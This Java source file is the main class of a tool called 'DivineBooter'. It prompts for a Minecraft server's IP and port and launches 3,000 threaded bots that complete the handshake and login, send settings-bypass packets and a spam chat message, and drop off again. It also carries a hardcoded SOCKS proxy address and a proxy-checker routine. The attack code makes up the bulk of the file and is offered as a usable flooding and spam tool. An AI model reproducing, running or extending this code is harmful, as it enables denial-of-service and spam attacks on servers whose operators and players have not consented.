package studio.thamessia;

import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;
import studio.thamessia.Bypass.ChatMode;
import studio.thamessia.Bypass.ClientSettingsBypass;
import studio.thamessia.Bypass.MainHand;
import studio.thamessia.Packets.Handshake.HandshakePacket;
import studio.thamessia.Packets.Handshake.NextState;
import studio.thamessia.Packets.Login.LoginStart;
import studio.thamessia.Packets.Login.SetCompression;
import studio.thamessia.Packets.Serverbound.InteractEntity;
import studio.thamessia.Packets.Serverbound.Type;
import studio.thamessia.Packets.Status.StatusManager;
import studio.thamessia.Utils.GameStateOutput;

import java.io.*;
import java.net.*;
import java.util.*;

public class Main {
    public static InputStreamReader input = new InputStreamReader(System.in);
    public static BufferedReader bufferedReader = new BufferedReader(input);

    public static void executeAttack() throws InterruptedException, IOException, ParseException {
        System.out.print("Insert IP: ");
        String IP = bufferedReader.readLine();

        System.out.print("Insert port: ");
        int port = Integer.parseInt(bufferedReader.readLine());

        System.out.print("Insert message to spam: ");
        String message = bufferedReader.readLine();

        String serverStatus = StatusManager.serverStatus(IP, (int) port);

        JSONParser jsonParser = new JSONParser();
        JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

        JSONObject version = (JSONObject) jsonObject.get("version");
        long protocol = (long) version.get("protocol");

        //System.out.println(protocol);

        InetSocketAddress address = new InetSocketAddress(IP, port);
        Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("188.166.104.152", 39088));

        List<Thread> bots = new ArrayList<>();

        System.out.println("Trying to start attack...");

        for(int j = 0; j < 3000; j++) {

            bots.add(new Thread(() -> {
                Socket socket = new Socket(); //just type "proxy" in socket's constructor parameters to make bots join proxied.
                try {
                    try {
                        socket.setTcpNoDelay(true);
                        socket.setTrafficClass(18);
                        socket.connect(address, 15000);
                    } catch (UnknownHostException e) {
                        System.err.println("[DivineError] Server is offline or doesn't exist!");
                    } catch (SocketTimeoutException e) {
                        System.err.println("[DivineError] Connection timed out, bots can't join!");
                    } catch (ConnectException e) {
                        System.err.println("[DivineError] Server has crashed or refuses connection.");
                    } catch (NullPointerException e) {
                        System.err.print("");
                    } catch (SocketException e) {
                        System.err.println("[DivineError] Proxy is having difficulty to connect, can't join!");
                    }

                    try {
                        DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                        HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                IP, (short) port, NextState.LOGIN);
                        handshakePacket.sendPacket(dataOutputStream);

                        Thread.sleep(250);

                        LoginStart loginStart = new LoginStart("404." + new Random().nextInt(5000) + "");
                        loginStart.sendPacket(dataOutputStream);

                        //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                        //clientSettingsBypass.sendPacket(dataOutputStream);

                        SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                        ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                        clientSettingsBypass.sendPacket(dataOutputStream);

                        GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                        gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                        InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);

                        /*new Thread(() -> {
                            try {
                                for (;;) interactEntity.sendPacket(dataOutputStream);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();*/

                        //LoginSuccess loginSuccess = new LoginSuccess();
                        //loginSuccess.readPacket(dataInputStream);

                        Thread.sleep(200);

//                        ByteArrayOutputStream uncompressedData = new ByteArrayOutputStream();
//                        DataOutputStream udd_outputStream = new DataOutputStream(uncompressedData);
//
//                        DataTypes.writeVarInt(udd_outputStream, 0x03);
//                        DataTypes.writeString(udd_outputStream, message);
//
//                        int dLength = uncompressedData.size();
//                        byte[] compressedData = CompressionUtils.compress(uncompressedData.toByteArray(), setCompression.getThreshold());
//
//                        ByteArrayOutputStream dL = new ByteArrayOutputStream();
//                        DataOutputStream dLOutputStream = new DataOutputStream(dL);
//                        DataTypes.writeVarInt(dLOutputStream, dLength);
//
//                        int packetLength = dL.size() + compressedData.length;
//
//                        DataTypes.writeVarInt(dataOutputStream, packetLength);
//                        DataTypes.writeVarInt(dataOutputStream, dLength);
//                        dataOutputStream.write(compressedData);



                        System.out.println("Sending bots...");

                        Thread.sleep(350);
                        socket.close();
                    } catch (SocketException e) {
                        System.err.print("");
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }));
        }

        for (Thread thread : bots) {
            thread.start();
            Thread.sleep(10);
        }
    }

    public static void checkProxy(String fileName) throws IOException {
        String fileStringManager;

        File file = new File(fileName);
        StringBuilder stringBuilder = new StringBuilder();

        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
            for (int i = 0; (fileStringManager = bufferedReader.readLine()) != null; i++) {
                stringBuilder.append(fileStringManager);
                InetAddress address = InetAddress.getByName(fileStringManager);

                if (address.isReachable(5000)) System.out.println("PROXY: " + fileStringManager + " is working");
                else System.out.println("PROXY: " + fileStringManager + " is not working.");
            }
        } catch (FileNotFoundException e) {
            System.err.println("File not found.");
        }

    }

    public static void main(String[] args) throws IOException {
        String select;

        while(true) {
            System.out.println("DivineBooter");
            System.out.print("> ");

            try {
                select = bufferedReader.readLine();

                if (select.equalsIgnoreCase("attack")) { executeAttack(); }
                else if (select.equalsIgnoreCase("proxychecker")) {
                    String fileName;

                    System.out.print("Type proxies' file name: ");
                    fileName = bufferedReader.readLine();

                    checkProxy(fileName);
                } else if (select.equals("help")) {
                    System.out.println("Help: displays this page.");
                    System.out.println("Proxychecker: checks if proxies (without port because it checks the host) are working.");
                    System.out.println("Attack: attacks.");
                }
                else { System.err.println("Unknown command! Type \"help\" fpor a list of commands."); }
            } catch (InputMismatchException | InterruptedException | ParseException e) {
                System.err.println("You have to insert a string for the IP and");
                System.err.println("an integer number for the port!");
            } catch (ConnectException e) {
                System.err.println("[DivineBooter] Server is offline");
            } catch (NullPointerException e) {
                System.err.print("");
            } catch (SocketException e) {
                System.err.println("[DivineError] Server is lagging too much, bots can't join!");
            }
        }
    }
    //protected void finalize() throws IOException, ParseException, InterruptedException {
        //System.err.println("Emergency mode activated!");
        //System.out.println("Booting program...");
        //executeAttack();
    //}
}